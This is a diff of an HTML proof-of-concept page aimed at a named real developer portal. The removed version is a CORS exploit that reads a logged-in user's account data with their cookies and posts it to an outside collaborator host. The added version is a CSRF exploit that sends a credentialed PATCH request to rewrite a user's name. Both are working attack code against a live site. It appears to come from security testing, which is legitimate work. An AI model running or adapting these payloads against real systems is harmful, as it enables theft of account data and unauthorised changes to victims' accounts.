@@ -1,31 +1,43 @@
-<html>
-	<head>
-		<title>TrustedSec CORS POC</title>
-	</head>
-	<body>
-		<h1>TrustedSec CORS POC</h>
-		<script>
-			var crossoriginget = new XMLHttpRequest();
-			//The target site with the bad CORS configuration
-			var url = 'https://developerportal.epiroc.com/developer/users/67736cd2ba32ea163c145b13?api-version=2024-04-01-preview';
-			crossoriginget.open('GET', url, true);
-			/*  This tells the browser to send the request with cookies;
-			    requires “Access-Control-Allow-Credentials = true” in
-			    response headers for this.responseText to be readable.  */
-			crossoriginget.withCredentials = true;
-			crossoriginget.onload = reqListener;
-			crossoriginget.send();
-			/*  Once the cross-origin request completes, attempt to read the
-			    response text and send it to the malicious server using an
-			    HTTP POST request.  */
-			function reqListener() {
-				var exfiltraterequest = new XMLHttpRequest();
-				//Our server hosting the CORS attack
-				var maliciousurl = 'https://txuekpb3ttuv1t60d8slzho6jxppdg15.oastify.com/';
-				exfiltraterequest.open('POST', maliciousurl);
-				exfiltraterequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-				exfiltraterequest.send('responsehtml=' + encodeURIComponent(String(this.responseText)));
-			};
-		</script>
-	</body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF POC</title>
+</head>
+<body>
+    <h1>CSRF Proof of Concept</h1>
+    <p>If the victim clicks the button, their session might be exploited.</p>
+    <button onclick="sendCSRF()">Trigger CSRF</button>
+
+    <script>
+        function sendCSRF() {
+            fetch("https://developerportal.epiroc.com/developer/users/6772c1c8ba32ea163c145b04?api-version=2022-04-01-preview", {
+                method: "PATCH",
+                credentials: "include", // Send victim's cookies
+                headers: {
+                    "Content-Type": "application/json",
+                    "If-Match": "*"
+                },
+                body: JSON.stringify({
+                    "firstName": "test1",
+                    "lastName": "human"
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("CSRF attack successful!");
+                } else {
+                    response.text().then(text => {
+                        alert("CSRF failed with response: " + text);
+                    });
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                alert("An error occurred. Check the console for details.");
+            });
+        }
+    </script>
+</body>
 </html>
